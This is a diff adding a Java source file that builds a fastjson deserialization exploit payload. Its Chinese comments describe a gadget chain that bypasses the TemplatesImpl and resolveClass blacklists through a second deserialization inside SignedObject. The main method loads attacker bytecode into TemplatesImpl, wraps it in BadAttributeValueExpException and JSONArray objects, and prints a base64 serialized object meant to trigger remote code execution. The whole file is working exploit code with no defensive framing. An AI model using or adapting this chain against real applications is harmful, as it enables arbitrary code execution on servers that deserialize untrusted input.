@@ -1,0 +1,97 @@
+package fj;
+import com.alibaba.fastjson.JSONArray;
+import com.alibaba.fastjson.JSONObject;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import com.sun.org.apache.xpath.internal.objects.XString;
+import org.springframework.aop.target.HotSwappableTargetSource;
+
+import javax.management.BadAttributeValueExpException;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.security.KeyPair;
+import java.security.KeyPairGenerator;
+import java.security.Signature;
+import java.security.SignedObject;
+import java.util.ArrayList;
+import java.util.Base64;
+import java.util.HashMap;
+
+/**
+ *
+ * 绕过第一次的TemplatesImpl黑名单检查
+    BadAttributeValueExpException#readObject
+    JSONOBJECT#toString
+    SignedObject#getObject
+ * 二次反序列化
+    * 引用绕过JSON自带resolveClass的黑名单检查
+        BadAttributeValueExpException#readObject
+        JSONArray#toString
+        TemplatesImpl#getOutputProperties
+            TemplatesImpl#newTransformer
+            TemplatesImpl#getTransletInstance
+            TemplatesImpl#defineTransletClasses
+            TemplatesImpl#defineClass
+  */
+public class dou_rev {
+    public static void main(String[] args) throws Exception {
+        ArrayList<Object> list = new ArrayList<>();
+        TemplatesImpl templatesimpl = new TemplatesImpl();
+
+        byte[] bytecodes = Files.readAllBytes(Paths.get("C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class"));
+
+        setValue(templatesimpl,"_name","aaa");
+        setValue(templatesimpl,"_bytecodes",new byte[][] {bytecodes});
+        setValue(templatesimpl, "_tfactory", new TransformerFactoryImpl());
+
+        list.add(templatesimpl);
+
+        JSONArray jo = new JSONArray();
+        jo.add(templatesimpl);
+
+        BadAttributeValueExpException exp = new BadAttributeValueExpException(1);
+        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
+        val.setAccessible(true);
+        val.set(exp,jo);
+        list.add(exp);
+        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
+        kpg.initialize(1024);
+        KeyPair kp = kpg.generateKeyPair();
+        SignedObject signedObject = new SignedObject((Serializable) list, kp.getPrivate(), Signature.getInstance("DSA"));
+
+        //触发SignedObject#getObject
+        JSONArray jsonArray1 = new JSONArray();
+        jsonArray1.add(signedObject);
+
+        BadAttributeValueExpException bd1 = new BadAttributeValueExpException(null);
+        val.set(bd1,jsonArray1);
+        System.out.println(serial(bd1));
+    }
+
+    public static String serial(Object o) throws IOException {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(o);
+        oos.close();
+
+        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
+        return base64String;
+
+    }
+
+    public static void deserial(String data) throws Exception {
+        byte[] base64decodedBytes = Base64.getDecoder().decode(data);
+        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
+        ObjectInputStream ois = new ObjectInputStream(bais);
+        ois.readObject();
+        ois.close();
+    }
+
+    public static void setValue(Object obj, String name, Object value) throws Exception{
+        Field field = obj.getClass().getDeclaredField(name);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+}
